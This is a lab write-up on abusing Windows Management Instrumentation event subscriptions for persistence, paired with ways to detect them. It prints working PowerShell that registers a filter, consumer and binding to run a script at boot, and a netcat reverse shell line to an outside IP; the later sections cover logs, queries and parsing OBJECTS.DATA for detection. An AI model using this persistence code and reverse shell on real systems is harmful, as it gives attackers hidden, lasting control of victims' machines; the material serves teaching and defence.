# Abusing-windows-managent-instrumentation

## Abusing Windows Managent Instrumentation

WMI events are made up of 3 key pieces:

* event filters - conditions that the system will listen for (i.e on new process created, on new disk added, etc.)
* event consumers - consumers can carry out actions when event filters are triggered (i.e run a program, log to a log file, execute a script, etc.)
* filter to consumer bindings - the gluing matter that marries event filters and event consumers together in order for the event consumers to get invoked.

WMI Events can be used by both offenders (persistence, i.e launch payload when system is booted) as well as defenders (kill process evil.exe on its creation).

### Execution

Creating `WMI __EVENTFILTER`, `WMI __EVENTCONSUMER` and `WMI __FILTERTOCONSUMERBINDING`:

{% code title="attacker\@victim" %}
```csharp
# WMI __EVENTFILTER
$wmiParams = @{
    ErrorAction = 'Stop'
    NameSpace = 'root\subscription'
}

$wmiParams.Class = '__EventFilter'
$wmiParams.Arguments = @{
    Name = 'evil'
    EventNamespace = 'root\CIMV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 1200"
}
$filterResult = Set-WmiInstance @wmiParams

# WMI __EVENTCONSUMER
$wmiParams.Class = 'CommandLineEventConsumer'
$wmiParams.Arguments = @{
    Name = 'evil'
    ExecutablePath = "C:\shell.cmd"
}
$consumerResult = Set-WmiInstance @wmiParams

#WMI __FILTERTOCONSUMERBINDING
$wmiParams.Class = '__FilterToConsumerBinding'
$wmiParams.Arguments = @{
    Filter = $filterResult
    Consumer = $consumerResult
}

$bindingResult = Set-WmiInstance @wmiParams
```
{% endcode %}

Note that the `ExecutablePath` property of the `__EVENTCONSUMER` points to a rudimentary netcat reverse shell:

{% code title="c:\shell.cmd" %}
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
```
{% endcode %}

### Observations

Note the process ancestry of the shell - as usual, wmi/winrm spawns processes from `WmiPrvSE.exe`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJFlv-3hk4nhwjxR_Cf%2F-LJFlrXHGnVNJ2K8QgGB%2Fwmi-shell-system.png?alt=media\&token=931ba19a-ff95-4acb-ad2a-f85778c506cd)

On the victim/suspected host, we can see all the regsitered WMI event filters, event consumers and their bindings and inspect them for any malicious intents with these commands:

{% code title="::EventFilter\@victim" %}
```csharp
Get-WmiObject -Class __EventFilter -Namespace root\subscription
```
{% endcode %}

Note the `Query` property suggests this wmi filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJFmfw9kwk76Ka6DRY-%2F-LJFoWCsZnYguHL-YlRk%2Fwmi-filter.png?alt=media\&token=72c20f66-d270-4462-9428-9a4710293a60)

Event consumer, suggesting that the `shell.cmd` will be executed upon invokation as specified in the property `ExecutablePath`:

{% code title="::EventConsumer\@victim" %}
```csharp
Get-WmiObject -Class __EventConsumer -Namespace root\subscription
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJFmfw9kwk76Ka6DRY-%2F-LJFoUDiQNMoub4nipAw%2Fwmi-consumer.png?alt=media\&token=326c057a-2658-4d96-9599-9bf1dd70b514)

{% code title="::FilterToConsumerBinding\@victim" %}
```csharp
Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJFmfw9kwk76Ka6DRY-%2F-LJFoUDoGS6qfxn5bswJ%2Fwmi-binding.png?alt=media\&token=3e6a74ac-f8f3-4e27-b0f0-60bf2ddb4930)

Microsoft-Windows-WMI-Activity/Operational contains logs for event `5861` that capture event filter and event consumer creations on the victim system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJFu0z2PR5lVNU6h7Zl%2F-LJFu5W0WMSmc57OYhqW%2Fwmi-filter-consumer-creation.png?alt=media\&token=4eaa1e32-3e03-4656-a828-5de07fe2c7a3)

### Inspection

If you suspect a host to be compromised and you want to inspect any `FilterToConsumer` bindings, you can do it with PSRemoting and the commands shown above or you can try getting the file`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`

Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI_Forensics) by David Pany to parse the `OBJECTS.DATA` file and get a list of bindings like:

```bash
./PyWMIPersistenceFinder.py OBJECTS.DATA
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJPjO6OUGF-TmfeagHM%2F-LJPl54xsWb7cPiiIVAD%2Fwmi-parser.png?alt=media\&token=1a46ba91-e023-44ff-89ca-babceb3c8e2f)

#### Strings + Grep

If you are limited to only the native \*nix/cygwin utils you have to hand, you can get a pretty good insight into the bindings with the following command:

```csharp
strings OBJECTS.DATA | grep -i filtertoconsumerbinding -A 3 --color
```

Below are the results:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJPm8Roq2cANLY07shA%2F-LJPpLp-tBdXbAIi3dLV%2Fwmi-strings-grep.png?alt=media\&token=bbea10b8-a06e-4ff2-8c25-9ff8423f8d41)

From the above graphic, we can easily see that one binding connects two evils - the evil consumer and the evil filter.

Now that you know that you are dealing with `evil` filter and `evil` consumer, use another rudimentary piped command to look into the evil further:

```csharp
strings OBJECTS.DATA | grep -i 'evil' -B3 -A2 --color
```

Note how we can get a pretty decent glimpse into the malicious WMI persistence even with simple tools to hand - note the `C:\shell.cmd`and `SELECT * FROM` ... - if you recall, this is what we put in our consumers and filters at the very beginning of the lab:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJPm8Roq2cANLY07shA%2F-LJPr3CKPWXT_fsrCkW9%2Fwmi-strings-grep2.png?alt=media\&token=1876b82d-d2ef-4a23-88a2-2a3d5b9cc513)

### References

Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) and other great resources listed below:

{% embed url="https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/" %}

{% embed url="https://youtu.be/0SjMgnGwpq8" %}

{% embed url="https://attack.mitre.org/wiki/Technique/T1084" %}

{% embed url="https://pentestarmoury.com/2016/07/13/151/" %}

{% embed url="https://msdn.microsoft.com/en-us/library/aa394084(v=vs.85).aspx?f=255&MSPPError=-2147217396" %}

{% embed url="https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177(v=winembedded.5)" %}
